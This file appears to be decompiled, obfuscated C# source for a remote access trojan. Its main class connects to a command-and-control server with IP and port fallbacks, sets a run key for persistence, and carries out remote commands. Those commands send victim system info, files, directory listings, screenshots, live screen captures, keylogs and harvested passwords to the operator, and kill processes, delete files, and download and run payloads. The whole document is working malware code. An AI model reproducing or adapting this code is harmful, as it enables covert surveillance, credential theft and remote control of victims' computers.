using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace sohirmnvrs;

public class sohirmnvrsMCDM
{
	private sohirmnvrsDRIVF sohirmnvrsHD = new sohirmnvrsDRIVF();

	public DateTime sohirmnvrslTimeUtc;

	private Dictionary<string, byte[]> sohirmnvrstasks = new Dictionary<string, byte[]>();

	private int sohirmnvrsthreadCnts = 0;

	private int sohirmnvrsbuffSize = 1024;

	public sohirmnvrsOCMD sohirmnvrsCMD;

	public bool sohirmnvrsreqCnls = false;

	private int sohirmnvrsatmps = 0;

	private bool sohirmnvrsthrRuning = false;

	private Thread sohirmnvrsfunThread;

	public TcpClient sohirmnvrstcpsck;

	private int sohirmnvrsbytesRead = 0;

	public NetworkStream sohirmnvrsnetStream;

	public int port_sn = 0;

	private bool sohirmnvrshasusb = false;

	private bool sohirmnvrsiscam = false;

	public bool sohirmnvrsis_working = false;

	private sohirmnvrsTHRE sohirmnvrsStateObj = new sohirmnvrsTHRE();

	public Process sohirmnvrsCProcess;

	public ProcessStartInfo sohirmnvrsCStartInfo;

	private bool sohirmnvrscapScreen = false;

	private bool sohirmnvrsiswitch = false;

	private bool sohirmnvrsstr_writer = false;

	public bool sohirmnvrsautCnls = false;

	private ThreadStart sohirmnvrsfunStarter;

	private int sohirmnvrsscrSize = 210;

	public string[] sohirmnvrsget_command()
	{
		try
		{
			byte[] array = new byte[5];
			sohirmnvrsbytesRead = sohirmnvrsnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= sohirmnvrsbytesRead)
			{
				int count = ((num3 > sohirmnvrsbuffSize) ? sohirmnvrsbuffSize : num3);
				sohirmnvrsbytesRead = sohirmnvrsnetStream.Read(array2, num2, count);
				num2 += sohirmnvrsbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.ToLower().Split(new char[1] { '=' });
		}
		catch
		{
			sohirmnvrsis_working = false;
			return null;
		}
	}

	private void sohirmnvrspush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				sohirmnvrspush_data(File.ReadAllBytes(lfile), "sohirmnvrs-file=!sohirmnvrs".Split(new char[1] { '!' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public bool sohirmnvrspush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			sohirmnvrsCMD.sohirmnvrsrunTime = DateTime.Now;
			if (sohirmnvrsstr_writer)
			{
				return false;
			}
			sohirmnvrsstr_writer = true;
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + num];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !sohirmnvrsreqCnls)
			{
				int num5 = ((num4 > sohirmnvrsbuffSize) ? sohirmnvrsbuffSize : num4);
				sohirmnvrsnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				sohirmnvrsCMD.sohirmnvrsrunTime = DateTime.Now;
			}
			sohirmnvrsstr_writer = false;
			if (sohirmnvrsreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			sohirmnvrsstr_writer = false;
			sohirmnvrsis_working = false;
			return false;
		}
	}

	private void sohirmnvrspass_info()
	{
		try
		{
			if (File.Exists(sohirmnvrsCONF.sohirmnvrsget_ppath() + sohirmnvrsCONF.sohirmnvrspssApp + ".exe|sohirmnvrs".Split(new char[1] { '|' })[0]))
			{
				sohirmnvrsCMD.sohirmnvrsdo_process(sohirmnvrsCONF.sohirmnvrsget_ppath() + sohirmnvrsCONF.sohirmnvrspssApp + ".exe|sohirmnvrs".Split(new char[1] { '|' })[0]);
				int num = 0;
				while (true)
				{
					if (num < 10)
					{
						Thread.Sleep(50);
						if (File.Exists(sohirmnvrsCONF.sohirmnvrsget_ppath() + sohirmnvrsCONF.sohirmnvrspssApp))
						{
							break;
						}
						num++;
						continue;
					}
					return;
				}
				byte[] data = File.ReadAllBytes(sohirmnvrsCONF.sohirmnvrsget_ppath() + sohirmnvrsCONF.sohirmnvrspssApp);
				sohirmnvrspush_data(data, "sohirmnvrs-paskl=send|sohirmnvrs".Split(new char[1] { '|' })[0]);
			}
			else
			{
				sohirmnvrspush_data(null, "sohirmnvrs-sndps=send|sohirmnvrs".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrssaveFile(string filePath)
	{
		try
		{
			byte[] array = sohirmnvrspull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	private void sohirmnvrsuser_info()
	{
		string text = sohirmnvrsCONF.zuissloadAV();
		string text2 = sohirmnvrsCONF.sohirmnvrslancard + "|" + sohirmnvrsCONF.sohirmnvrscname + "|" + sohirmnvrsCONF.sohirmnvrsuname + "|" + sohirmnvrsCONF.sohirmnvrsuip + "|" + sohirmnvrsCONF.sohirmnvrsOsname().Replace('|', '-') + "|" + sohirmnvrsCONF.sohirmnvrsapver.Replace('|', '-') + "|" + text.Replace('|', '-');
		text2 += "||";
		text2 = text2 + "|" + sohirmnvrsCONF.sohirmnvrsget_mpath();
		byte[] bytes = Encoding.UTF8.GetBytes(text2);
		sohirmnvrspush_data(bytes, "sohirmnvrs-info=user|sohirmnvrs".Split(new char[1] { '|' })[0]);
		if (!sohirmnvrshasusb && Directory.Exists(sohirmnvrsCONF.sohirmnvrsusbPath() + "data!sohirmnvrs".Split(new char[1] { '!' })[0]))
		{
			sohirmnvrshasusb = true;
		}
		if (sohirmnvrshasusb)
		{
			sohirmnvrspush_data(null, "sohirmnvrs-hasusb=" + sohirmnvrsCONF.sohirmnvrsusbPath() + "data!sohirmnvrs".Split(new char[1] { '!' })[0]);
		}
		if (File.Exists(sohirmnvrsCONF.sohirmnvrsusbPath() + sohirmnvrsCONF.sohirmnvrsusbwrm))
		{
			sohirmnvrspush_data(null, "sohirmnvrs-hasusbw=!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsCONF.sohirmnvrsusbPath() + "data!sohirmnvrs".Split(new char[1] { '!' })[0]);
		}
		if (sohirmnvrsiscam)
		{
			sohirmnvrspush_data(null, "sohirmnvrs-hascam=!sohirmnvrs".Split(new char[1] { '!' })[0]);
		}
	}

	private bool sohirmnvrsIPSConfig()
	{
		try
		{
			sohirmnvrsCONF.sohirmnvrsdefaultP = sohirmnvrsCMD.sohirmnvrsserverIPD()[0];
			if (sohirmnvrsatmps > 21)
			{
				sohirmnvrsCONF.sohirmnvrsdefaultP = sohirmnvrsCMD.sohirmnvrsserverIPD()[1];
				if (sohirmnvrsatmps > 26)
				{
					sohirmnvrsatmps = 0;
				}
			}
			sohirmnvrsatmps++;
			sohirmnvrstcpsck = new TcpClient();
			sohirmnvrstcpsck.Connect(sohirmnvrsCONF.sohirmnvrsdefaultP, sohirmnvrsCONF.sohirmnvrsport);
			sohirmnvrsatmps = 0;
			return true;
		}
		catch
		{
			sohirmnvrsports_switch();
			return false;
		}
	}

	private void sohirmnvrslookup_connect(object source)
	{
		try
		{
			if (!sohirmnvrsthrRuning)
			{
				sohirmnvrsthrRuning = true;
				sohirmnvrsCMD.sohirmnvrscheckLast();
				if (!sohirmnvrsis_working || !sohirmnvrstcpsck.Connected)
				{
					sohirmnvrsis_working = sohirmnvrsIPSConfig();
					if (sohirmnvrsis_working)
					{
						sohirmnvrsbuffSize = sohirmnvrstcpsck.ReceiveBufferSize;
						if (!sohirmnvrshasusb && Directory.Exists(sohirmnvrsCONF.sohirmnvrsusbPath() + "data!sohirmnvrs".Split(new char[1] { '!' })[0]))
						{
							sohirmnvrshasusb = true;
						}
						sohirmnvrssee_responce();
					}
				}
			}
			else
			{
				sohirmnvrsthreadCnts++;
			}
			sohirmnvrsthrRuning = false;
		}
		catch
		{
			sohirmnvrsatmps++;
			sohirmnvrsthrRuning = false;
			sohirmnvrsthreadCnts = 0;
			sohirmnvrsstr_writer = false;
			sohirmnvrsis_working = false;
			sohirmnvrsiswitch = false;
		}
	}

	public void sohirmnvrsports_switch()
	{
		port_sn++;
		switch (port_sn)
		{
		case 0:
			sohirmnvrsCONF.sohirmnvrsport = sohirmnvrsCONF.port;
			break;
		case 1:
			sohirmnvrsCONF.sohirmnvrsport = sohirmnvrsCONF.aport;
			break;
		case 2:
			sohirmnvrsCONF.sohirmnvrsport = sohirmnvrsCONF.bport;
			break;
		case 3:
			sohirmnvrsCONF.sohirmnvrsport = sohirmnvrsCONF.cport;
			break;
		case 4:
			sohirmnvrsCONF.sohirmnvrsport = sohirmnvrsCONF.dport;
			break;
		}
		if (port_sn >= 4)
		{
			port_sn = 0;
		}
	}

	public void sohirmnvrsload_app()
	{
		try
		{
			string text = sohirmnvrsCONF.sohirmnvrsget_mpath() + sohirmnvrsCONF.sohirmnvrsmainApp + ".exe|sohirmnvrs".Split(new char[1] { '|' })[0];
			sohirmnvrsCONF.sohirmnvrsset_run("wlnmr|sohirmnvrs".Split(new char[1] { '|' })[0], sohirmnvrsCONF.sohirmnvrsget_mpath() + sohirmnvrsCONF.sohirmnvrsmainApp + ".exe|sohirmnvrs".Split(new char[1] { '|' })[0]);
			if (text != sohirmnvrsCONF.filePath)
			{
				Thread.Sleep(50);
				File.WriteAllBytes(sohirmnvrsCONF.sohirmnvrsget_mpath() + sohirmnvrsCONF.sohirmnvrsmainApp + ".exe|sohirmnvrs".Split(new char[1] { '|' })[0], File.ReadAllBytes(sohirmnvrsCONF.filePath));
			}
		}
		catch
		{
		}
	}

	public void sohirmnvrslist_processes()
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName.ToString() + ">!sohirmnvrs".Split(new char[1] { '!' })[0];
				text += "0>|sohirmnvrs".Split(new char[1] { '|' })[0];
				text += "<!sohirmnvrs".Split(new char[1] { '!' })[0];
			}
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			sohirmnvrspush_data(bytes, "sohirmnvrs-procl=peoc|sohirmnvrs".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void sohirmnvrsdo_start()
	{
		sohirmnvrsCMD = new sohirmnvrsOCMD(this);
		sohirmnvrsCMD.sohirmnvrsrunTime = DateTime.Now;
		sohirmnvrsCONF.sohirmnvrsInfo();
		sohirmnvrsHD.iserver = this;
		sohirmnvrsHD.sohirmnvrsmainPath = sohirmnvrsCONF.sohirmnvrsget_mpath();
		TimerCallback callback = sohirmnvrslookup_connect;
		Timer sohirmnvrstimer = new Timer(callback, sohirmnvrsStateObj, 35100, 45000);
		sohirmnvrsStateObj.sohirmnvrstimer = sohirmnvrstimer;
		sohirmnvrsCMD.sohirmnvrsseekilogr();
		Thread.Sleep(200);
		sohirmnvrsCMD.sohirmnvrsseeUSB();
		Process[] processesByName = Process.GetProcessesByName(sohirmnvrsCONF.sohirmnvrsmainApp);
		if (processesByName.Length <= 0)
		{
			return;
		}
		int id = Process.GetCurrentProcess().Id;
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			if (process.Id != id)
			{
				sohirmnvrsCMD.sohirmnvrsbreak_process(process.Id);
			}
		}
	}

	public bool sohirmnvrssend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">!sohirmnvrs".Split(new char[1] { '!' })[0] + fileName;
				sohirmnvrspush_data(data, "sohirmnvrs-afile=!sohirmnvrs".Split(new char[1] { '!' })[0] + fileinfo);
				return false;
			}
			sohirmnvrspush_data(null, "sohirmnvrs-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public bool sohirmnvrssplit_file(string SourceFile, int nNoofFiles)
	{
		bool result = false;
		try
		{
			List<string> list = new List<string>();
			FileStream fileStream = new FileStream(SourceFile, FileMode.Open, FileAccess.Read);
			int num = (int)Math.Ceiling((double)fileStream.Length / (double)nNoofFiles);
			string text = Path.GetDirectoryName(SourceFile) + "\\splitz".Split(new char[1] { '!' })[0];
			if (!Directory.Exists(text))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(text);
				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			}
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(SourceFile);
			string extension = Path.GetExtension(SourceFile);
			for (int i = 0; i < nNoofFiles; i++)
			{
				FileStream fileStream2 = new FileStream(text + "\\!sohirmnvrs".Split(new char[1] { '!' })[0] + fileNameWithoutExtension + ".!sohirmnvrs".Split(new char[1] { '!' })[0] + i.ToString().PadLeft(5, Convert.ToChar("0")) + extension + ".dat!sohirmnvrs".Split(new char[1] { '!' })[0], FileMode.Create, FileAccess.Write);
				int num2 = 0;
				byte[] buffer = new byte[num];
				if ((num2 = fileStream.Read(buffer, 0, num)) > 0)
				{
					fileStream2.Write(buffer, 0, num2);
					string item = fileNameWithoutExtension + "." + i.ToString().PadLeft(3, Convert.ToChar("0")) + extension.ToString();
					list.Add(item);
				}
				fileStream2.Close();
			}
			fileStream.Close();
			return result;
		}
		catch
		{
			return result;
		}
	}

	private void sohirmnvrsis_screen(string screenSize)
	{
		try
		{
			sohirmnvrsSCRNS sohirmnvrsSCRNS2 = new sohirmnvrsSCRNS();
			sohirmnvrsscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (sohirmnvrscapScreen && sohirmnvrsis_working)
			{
				Bitmap val = sohirmnvrsSCRNS2.sohirmnvrsscreen(sohirmnvrsscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					sohirmnvrspush_data(memoryStream.ToArray(), "sohirmnvrs-scren=cacen|sohirmnvrs".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void sohirmnvrsimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap(path);
			Bitmap val2 = new Bitmap((Image)(object)val, 210, 160);
			if (val2 != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">!sohirmnvrs".Split(new char[1] { '!' })[0];
				text = text + fileInfo.CreationTimeUtc.ToString() + ">!sohirmnvrs".Split(new char[1] { '!' })[0];
				text = text + sohirmnvrsCMD.sohirmnvrsget_size(fileInfo.Length) + ">!sohirmnvrs".Split(new char[1] { '!' })[0];
				MemoryStream memoryStream = new MemoryStream();
				((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Png());
				sohirmnvrspush_data(memoryStream.ToArray(), "sohirmnvrs-thumb=view!sohirmnvrs".Split(new char[1] { '!' })[0] + text);
			}
		}
		catch
		{
		}
	}

	public byte[] sohirmnvrspull_data()
	{
		try
		{
			sohirmnvrsCMD.sohirmnvrsrunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			sohirmnvrsbytesRead = sohirmnvrsnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !sohirmnvrsreqCnls)
			{
				int count = ((num3 > sohirmnvrsbuffSize) ? sohirmnvrsbuffSize : num3);
				sohirmnvrsbytesRead = sohirmnvrsnetStream.Read(array2, num, count);
				num += sohirmnvrsbytesRead;
				num3 -= sohirmnvrsbytesRead;
				sohirmnvrsCMD.sohirmnvrsrunTime = DateTime.Now;
			}
			if (sohirmnvrsreqCnls)
			{
				sohirmnvrsnetStream.Flush();
				array2 = null;
			}
			return array2;
		}
		catch
		{
			sohirmnvrsis_working = false;
			return null;
		}
	}

	private void sohirmnvrsuploadKLogs(string typ)
	{
		try
		{
			if (!File.Exists(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp))
			{
				return;
			}
			string fileName = Path.GetFileName(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp);
			DateTime lastWriteTimeUtc = File.GetLastWriteTimeUtc(sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp);
			string text = "savky|sohirmnvrs".Split(new char[1] { '|' })[0];
			string path = sohirmnvrsCONF.sohirmnvrskiPath() + sohirmnvrsCONF.sohirmnvrskiyApp;
			byte[] bytes;
			using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using StreamReader streamReader = new StreamReader(stream);
				bytes = Encoding.ASCII.GetBytes(streamReader.ReadToEnd());
			}
			if (typ == text)
			{
				if (sohirmnvrslTimeUtc.ToString() != lastWriteTimeUtc.ToString() && bytes.Length > 0)
				{
					sohirmnvrspush_data(bytes, "sohirmnvrs-" + typ + "=!sohirmnvrs".Split(new char[1] { '!' })[0] + fileName);
				}
			}
			else if (bytes.Length > 0)
			{
				sohirmnvrspush_data(bytes, "sohirmnvrs-" + typ + "=|sohirmnvrs".Split(new char[1] { '|' })[0] + fileName);
			}
			sohirmnvrslTimeUtc = lastWriteTimeUtc;
		}
		catch
		{
		}
	}

	private void sohirmnvrssee_scren(string screenSize)
	{
		try
		{
			sohirmnvrsSCRNS sohirmnvrsSCRNS2 = new sohirmnvrsSCRNS();
			sohirmnvrsscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = sohirmnvrsSCRNS2.sohirmnvrsscreen(sohirmnvrsscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				sohirmnvrspush_data(memoryStream.ToArray(), "sohirmnvrs-sascr=creen!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	private void sohirmnvrsscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			sohirmnvrsscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	public void sohirmnvrsremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private void sohirmnvrsupdate_Stats()
	{
		try
		{
			byte[] data = sohirmnvrsCONF.sohirmnvrsapps_status();
			sohirmnvrspush_data(data, "sohirmnvrs-asatas=upds|sohirmnvrs".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void sohirmnvrssee_responce()
	{
		if (!sohirmnvrsiswitch)
		{
			sohirmnvrsiswitch = true;
			sohirmnvrsnetStream = sohirmnvrsCMD.sohirmnvrsNS(sohirmnvrstcpsck);
			sohirmnvrscapScreen = false;
			string finame;
			int nums;
			while (sohirmnvrsis_working)
			{
				string[] switchType = sohirmnvrsget_command();
				if (switchType != null)
				{
					sohirmnvrsreqCnls = false;
					string text = switchType[0];
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("sohirmnvrs$!sohirmnvrs".Split(new char[1] { '!' })[0] + text) : ("sohirmnvrs$!sohirmnvrs".Split(new char[1] { '!' })[0] + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "sohirmnvrs$fldr":
					{
						string Folders = sohirmnvrsHD.sohirmnvrscheckFolders(switchType[1]);
						if (Folders != null)
						{
							sohirmnvrsfunStarter = delegate
							{
								sohirmnvrspush_data(null, "sohirmnvrs-fldr=|sohirmnvrs".Split(new char[1] { '|' })[0] + Folders);
							};
							sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
							sohirmnvrsfunThread.Start();
						}
						break;
					}
					case "sohirmnvrs$rnnkl":
						sohirmnvrsCMD.sohirmnvrsseekilogr();
						break;
					case "sohirmnvrs$rnntc":
						sohirmnvrsCMD.sohirmnvrsseeutcl();
						break;
					case "sohirmnvrs$rupth":
						sohirmnvrspush_data(null, "sohirmnvrs-appth=!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsCONF.sohirmnvrsget_mpath());
						break;
					case "sohirmnvrs$secrun":
						sohirmnvrsCMD.sohirmnvrsseeSEC();
						break;
					case "sohirmnvrs$rnnub":
						sohirmnvrsCMD.sohirmnvrsseeusbl();
						break;
					case "sohirmnvrs$clping":
						sohirmnvrsCMD.sohirmnvrsrunTime = DateTime.Now;
						break;
					case "sohirmnvrs$clrcmd":
						sohirmnvrsCStartInfo = null;
						sohirmnvrsCProcess = null;
						break;
					case "sohirmnvrs$clrklg":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrsCMD.sohirmnvrsdeleteKLS();
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$sysky":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrsuploadKLogs("sysky|sohirmnvrs".Split(new char[1] { '|' })[0]);
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$keerun":
						sohirmnvrsCMD.sohirmnvrsseekilogr();
						break;
					case "sohirmnvrs$clstats":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrsupdate_Stats();
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$procl":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrslist_processes();
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$usbrun":
						sohirmnvrsCMD.sohirmnvrsseeUSB();
						break;
					case "sohirmnvrs$thumb":
						sohirmnvrsimage_info(switchType[1]);
						break;
					case "sohirmnvrs$scrsz":
						sohirmnvrsscreenSize(switchType[1]);
						break;
					case "sohirmnvrs$sndpl":
						sohirmnvrsCMD.sohirmnvrsdo_updated(text, switchType[1]);
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrspass_info();
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$cscreen":
						sohirmnvrssee_scren(switchType[1]);
						break;
					case "sohirmnvrs$stops":
						sohirmnvrscapScreen = false;
						break;
					case "sohirmnvrs$secup":
					case "sohirmnvrs$chrodll":
					case "sohirmnvrs$mozedll":
					case "sohirmnvrs$updatu":
					case "sohirmnvrs$usbwrm":
					case "sohirmnvrs$supdat":
					case "sohirmnvrs$downad":
					case "sohirmnvrs$poupld":
					case "sohirmnvrs$uklog":
					case "sohirmnvrs$sndps":
					case "sohirmnvrs$audio":
						sohirmnvrsCMD.sohirmnvrsdo_updated(text, switchType[1]);
						break;
					case "sohirmnvrs$filsz":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrsCMD.sohirmnvrsfile_info(switchType[1]);
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$passl":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrspass_info();
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$file":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrspush_file(switchType[1]);
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$cnls":
						sohirmnvrsautCnls = true;
						sohirmnvrsreqCnls = true;
						sohirmnvrscapScreen = false;
						break;
					case "sohirmnvrs$scren":
						sohirmnvrscapScreen = true;
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrsis_screen(switchType[1]);
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$dirs":
						sohirmnvrsfunThread = new Thread(sohirmnvrslistDrives);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$fles":
					{
						string files = sohirmnvrsHD.sohirmnvrslookupFiles(switchType[1]);
						if (files != null)
						{
							sohirmnvrsfunStarter = delegate
							{
								sohirmnvrspush_data(null, "sohirmnvrs-fles=!sohirmnvrs".Split(new char[1] { '!' })[0] + files);
							};
							sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
							sohirmnvrsfunThread.Start();
						}
						break;
					}
					case "sohirmnvrs$dowr":
						sohirmnvrssaveFile(switchType[1]);
						break;
					case "sohirmnvrs$endpo":
					{
						string[] array = switchType[1].Split(new char[1] { '|' });
						sohirmnvrsCMD.sohirmnvrsbreak_process(Convert.ToInt16(array[0].Trim()));
						break;
					}
					case "sohirmnvrs$splitr":
						if (switchType[1].Split(new char[1] { '|' }).Length == 2)
						{
							finame = switchType[1].Split(new char[1] { '|' })[0];
							nums = int.Parse(switchType[1].Split(new char[1] { '|' })[1]);
							sohirmnvrsfunStarter = delegate
							{
								sohirmnvrssplit_file(finame, nums);
							};
							sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
							sohirmnvrsfunThread.Start();
						}
						break;
					case "sohirmnvrs$delt":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrsremove_file(switchType[1]);
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$udlt":
						sohirmnvrsCMD.sohirmnvrsremove_user();
						sohirmnvrstcpsck.Close();
						break;
					case "sohirmnvrs$listf":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrsHD.sohirmnvrslookFiles(switchType[1]);
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$runf":
						sohirmnvrsCMD.sohirmnvrsdo_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "sohirmnvrs$info":
						sohirmnvrsfunThread = new Thread(sohirmnvrsuser_info);
						sohirmnvrsfunThread.Start();
						break;
					case "sohirmnvrs$dowf":
						sohirmnvrssaveFile(switchType[1]);
						break;
					case "sohirmnvrs$afile":
						sohirmnvrsfunStarter = delegate
						{
							sohirmnvrssend_auto(switchType[1]);
						};
						sohirmnvrsfunThread = new Thread(sohirmnvrsfunStarter);
						sohirmnvrsfunThread.Start();
						break;
					}
					continue;
				}
				sohirmnvrsis_working = false;
				break;
			}
			sohirmnvrsis_working = false;
			sohirmnvrscapScreen = false;
		}
		sohirmnvrsiswitch = false;
	}

	private void sohirmnvrslistDrives()
	{
		string text = sohirmnvrsHD.sohirmnvrslookupDrives();
		sohirmnvrspush_data(null, "sohirmnvrs-dirs=!sohirmnvrs".Split(new char[1] { '!' })[0] + text);
	}
}
